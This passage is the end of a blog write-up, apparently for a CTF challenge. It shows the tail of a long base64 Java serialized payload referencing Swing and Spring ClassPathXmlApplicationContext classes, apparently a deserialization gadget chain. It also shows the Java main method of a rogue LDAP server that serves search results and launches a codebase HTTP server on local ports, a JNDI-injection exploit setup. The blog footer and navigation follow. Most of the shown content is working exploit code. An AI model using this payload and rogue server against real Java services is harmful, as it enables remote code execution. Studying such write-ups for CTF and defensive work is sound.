GVyI3lKxkGKlgECAAFMAAZ0aGlzJDBxAH4AInhwcQB+AFJweHNyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKcHBwcHBwcHBwcHhzcgAvamF2YXguc3dpbmcudGV4dC5BYnN0cmFjdERvY3VtZW50JEJyYW5jaEVsZW1lbnQAUSlm9jzx8AIABEkACWxhc3RJbmRleEkACW5jaGlsZHJlblsACGNoaWxkcmVudAA0W0xqYXZheC9zd2luZy90ZXh0L0Fic3RyYWN0RG9jdW1lbnQkQWJzdHJhY3RFbGVtZW50O0wABnRoaXMkMHQAI0xqYXZheC9zd2luZy90ZXh0L0Fic3RyYWN0RG9jdW1lbnQ7eHIAMWphdmF4LnN3aW5nLnRleHQuQWJzdHJhY3REb2N1bWVudCRBYnN0cmFjdEVsZW1lbnTPsnjvvDfN2QMAAkwABnBhcmVudHQAGkxqYXZheC9zd2luZy90ZXh0L0VsZW1lbnQ7TAAGdGhpcyQwcQB+ASJ4cHBxAH4A93cEAAAAAHj/////AAAAAXVyADRbTGphdmF4LnN3aW5nLnRleHQuQWJzdHJhY3REb2N1bWVudCRBYnN0cmFjdEVsZW1lbnQ76hN0OXc60Z0CAAB4cAAAAAJzcgAtamF2YXguc3dpbmcudGV4dC5BYnN0cmFjdERvY3VtZW50JExlYWZFbGVtZW50avHT9IpjkckDAAFMAAZ0aGlzJDBxAH4BInhxAH4BI3EAfgElcQB+APd3BAAAAAB4cQB+APd3CAAAAAAAAAABeHBxAH4A93NxAH4BGwAAAAAAAAAAdXEAfgEeAAAACnBwcHBwcHBwcHB4cHBwAAAAAAAAAAAAAAAKcHBwc3IAJGphdmF4LnN3aW5nLkRlZmF1bHRCb3VuZGVkUmFuZ2VNb2RlbEJo7elGajz0AgAGSQAGZXh0ZW50WgALaXNBZGp1c3RpbmdJAANtYXhJAANtaW5JAAV2YWx1ZUwADGxpc3RlbmVyTGlzdHEAfgBAeHAAAAAAAAAAAGQAAAAAAAAAAHNxAH4A6nQAIGphdmF4LnN3aW5nLmV2ZW50LkNoYW5nZUxpc3RlbmVyc3IAJmphdmF4LnN3aW5nLkpUZXh0RmllbGQkU2Nyb2xsUmVwYWludGVyXFnaAlsy6XICAAFMAAZ0aGlzJDB0ABhMamF2YXgvc3dpbmcvSlRleHRGaWVsZDt4cHEAfgBScHh4AAAAAAAAAXEAfgEacHEAfgAoc3IAIWphdmF4LnN3aW5nLnRleHQuRGVmYXVsdEZvcm1hdHRlcm/GpIfshP8BAgAGWgANYWxsb3dzSW52YWxpZFoADGNvbW1pdE9uRWRpdFoADW92ZXJ3cml0ZU1vZGVMAA5kb2N1bWVudEZpbHRlcnEAfgD1TAAQbmF2aWdhdGlvbkZpbHRlcnEAfgA7TAAKdmFsdWVDbGFzc3EAfgATeHIAMWphdmF4LnN3aW5nLkpGb3JtYXR0ZWRUZXh0RmllbGQkQWJzdHJhY3RGb3JtYXR0ZXJIb2KeGrCXPgIAAUwAA2Z0ZnEAfgAieHBwAQABcHB2cgBCb3JnLnNwcmluZ2ZyYW1ld29yay5jb250ZXh0LnN1cHBvcnQuQ2xhc3NQYXRoWG1sQXBwbGljYXRpb25Db250ZXh0AAAAAAAAAAAAAAB4cHBwcHhxAH4ABXNxAH4AAnEAfgARcQB+AChxAH4BOHg=&quot;));</span></span><br><span class="line"><span class="comment">//            &#125; catch (ParseException e1) &#123;</span></span><br><span class="line"><span class="comment">//                e1.printStackTrace();</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line">            <span class="comment">/** Payload2 end **/</span></span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerAddress: &quot;+args[0]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;HttpServerPort: &quot;+args[1]);</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;LDAPServerPort: &quot;+args[2]);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">http_server_ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ldap_port</span> <span class="operator">=</span> <span class="number">8089</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">http_server_port</span> <span class="operator">=</span> <span class="number">8001</span>;</span><br><span class="line"></span><br><span class="line">        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);</span><br><span class="line">        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">全国大学生信息安全竞赛 CISCN 2024 Web Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2024/05/25/%E7%9C%9F%E5%A4%9C%E4%B8%AD%E7%9A%84%E4%B8%8A%E6%B5%B71/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">真夜中のドア - ShangHai(1)</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>